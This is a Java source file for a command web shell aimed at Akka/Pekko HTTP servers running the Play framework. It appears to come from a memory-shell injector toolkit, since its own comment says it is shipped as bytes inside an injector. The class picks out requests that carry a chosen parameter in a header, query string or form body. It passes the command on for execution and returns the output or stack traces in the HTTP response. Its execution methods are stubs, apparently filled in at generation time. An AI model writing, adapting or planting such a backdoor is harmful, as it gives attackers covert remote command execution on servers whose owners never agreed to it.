package com.reajason.javaweb.playframework.shell;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.net.URLDecoder;
import java.util.Optional;
import java.util.concurrent.CompletionStage;
import java.util.concurrent.TimeUnit;

/**
 * Command protocol over Akka/Pekko HTTP. Shipped as bytes inside the injector, so it stays
 * self-contained and owns no inner classes.
 */
public class PlayCommandShell {

    private static String paramName;

    public boolean matches(Object request) {
        if (header(request, paramName) != null || queryParam(request, paramName) != null) {
            return true;
        }
        return isForm(request);
    }

    public Object handle(Object request, Object materializer) {
        String parameter = param(request, materializer, paramName);
        if (parameter == null || parameter.isEmpty()) {
            return null;
        }
        try {
            String command = getParam(parameter);
            InputStream input = getInputStream(command);
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            if (input != null) {
                byte[] buffer = new byte[4096];
                int read;
                while ((read = input.read(buffer)) > 0) {
                    output.write(buffer, 0, read);
                }
                input.close();
            }
            return response(request, 200, output.toByteArray());
        } catch (Throwable e) {
            System.out.println(stackTrace(e));
            try {
                return response(request, 500, stackTrace(e).getBytes());
            } catch (Throwable unavailable) {
                return null;
            }
        }
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }

    private static String param(Object request, Object materializer, String name) {
        String query = queryParam(request, name);
        if (query != null) {
            return query;
        }
        String header = header(request, name);
        if (header != null) {
            return header;
        }
        try {
            return formValue(body(request, materializer), name);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static String queryParam(Object request, String name) {
        try {
            Object uri = request.getClass().getMethod("getUri").invoke(request);
            Object query = uri.getClass().getMethod("query").invoke(uri);
            return optionValue(query.getClass().getMethod("get", String.class).invoke(query, name));
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static String header(Object request, String name) {
        try {
            Object option = request.getClass().getMethod("getHeader", String.class).invoke(request, name);
            Object header = optionValueObject(option);
            if (header == null) {
                return null;
            }
            Object text = header.getClass().getMethod("value").invoke(header);
            return text == null ? null : text.toString();
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static boolean isForm(Object request) {
        try {
            Object entity = request.getClass().getMethod("entity").invoke(request);
            Object contentType = entity.getClass().getMethod("contentType").invoke(entity);
            return contentType.toString().toLowerCase().contains("application/x-www-form-urlencoded");
        } catch (Throwable ignored) {
            return false;
        }
    }

    /**
     * Scala's request/URI accessors return {@code scala.Option}; the Java-facing overloads return
     * {@code java.util.Optional}. Both are handled so one shell works across Akka and Pekko.
     */
    private static Object optionValueObject(Object option) {
        if (option == null) {
            return null;
        }
        if (option instanceof Optional) {
            return ((Optional<?>) option).isPresent() ? ((Optional<?>) option).get() : null;
        }
        try {
            if (Boolean.TRUE.equals(option.getClass().getMethod("isDefined").invoke(option))) {
                return option.getClass().getMethod("get").invoke(option);
            }
        } catch (Throwable ignored) {
            // not an Option at all
        }
        return null;
    }

    private static String optionValue(Object option) {
        Object value = optionValueObject(option);
        return value == null ? null : value.toString();
    }

    private static byte[] body(Object request, Object materializer) throws Exception {
        if (materializer == null) {
            return null;
        }
        Class<?> materializerClass = Class.forName(streamPrefix(request) + "stream.Materializer");
        Object entity = request.getClass().getMethod("entity").invoke(request);
        Object stage = entity.getClass()
                .getMethod("toStrict", long.class, materializerClass)
                .invoke(entity, 3000L, materializer);
        Object strict = ((CompletionStage<?>) stage).toCompletableFuture().get(5, TimeUnit.SECONDS);
        Object data = strict.getClass().getMethod("data").invoke(strict);
        return (byte[]) data.getClass().getMethod("toArray").invoke(data);
    }

    private static String formValue(byte[] body, String name) throws Exception {
        if (body == null || body.length == 0) {
            return null;
        }
        String text = new String(body, "UTF-8");
        for (String pair : text.split("&")) {
            int separator = pair.indexOf('=');
            String rawName = separator < 0 ? pair : pair.substring(0, separator);
            if (URLDecoder.decode(rawName, "UTF-8").equals(name)) {
                return separator < 0 ? "" : URLDecoder.decode(pair.substring(separator + 1), "UTF-8");
            }
        }
        return null;
    }

    private static Object response(Object request, int status, byte[] bytes) throws Exception {
        String model = modelPrefix(request);
        Class<?> statusCode = Class.forName(model + "StatusCode");
        Object code = statusCode.getMethod("int2StatusCode", int.class).invoke(null, status);

        String stream = streamPrefix(request);
        Class<?> byteString = Class.forName(stream + "util.ByteString");
        Class<?> byteStringModule = Class.forName(stream + "util.ByteString$");
        Object byteStringObject = byteStringModule.getField("MODULE$").get(null);
        Object content = byteStringModule.getMethod("apply", byte[].class)
                .invoke(byteStringObject, (Object) bytes);

        Class<?> contentTypesModule = Class.forName(model + "ContentTypes$");
        Object contentTypes = contentTypesModule.getField("MODULE$").get(null);
        Object contentType = contentTypesModule.getMethod("application$divoctet$minusstream").invoke(contentTypes);

        Class<?> contentTypeClass = Class.forName(model + "ContentType");
        Class<?> entityModule = Class.forName(model + "HttpEntity$");
        Object entities = entityModule.getField("MODULE$").get(null);
        Object entity = entityModule.getMethod("apply", contentTypeClass, byteString)
                .invoke(entities, contentType, content);

        Class<?> responseClass = Class.forName(model + "HttpResponse");
        Class<?> protocolClass = Class.forName(model + "HttpProtocol");
        Class<?> seqClass = Class.forName("scala.collection.immutable.Seq");
        Class<?> entityClass = Class.forName(model + "ResponseEntity");
        Object headers = Class.forName("scala.collection.immutable.Nil$")
                .getField("MODULE$").get(null);
        Class<?> protocols = Class.forName(model + "HttpProtocols$");
        Object protocol = protocols.getMethod("HTTP$div1$u002E1")
                .invoke(protocols.getField("MODULE$").get(null));
        return responseClass.getMethod("apply", statusCode, seqClass, entityClass, protocolClass)
                .invoke(null, code, headers, entity, protocol);
    }

    private static String modelPrefix(Object request) {
        return request.getClass().getName().startsWith("org.apache.pekko")
                ? "org.apache.pekko.http.scaladsl.model."
                : "akka.http.scaladsl.model.";
    }

    private static String streamPrefix(Object request) {
        return request.getClass().getName().startsWith("org.apache.pekko")
                ? "org.apache.pekko."
                : "akka.";
    }

    private static String stackTrace(Throwable throwable) {
        StringWriter writer = new StringWriter();
        throwable.printStackTrace(new PrintWriter(writer));
        return writer.toString();
    }
}
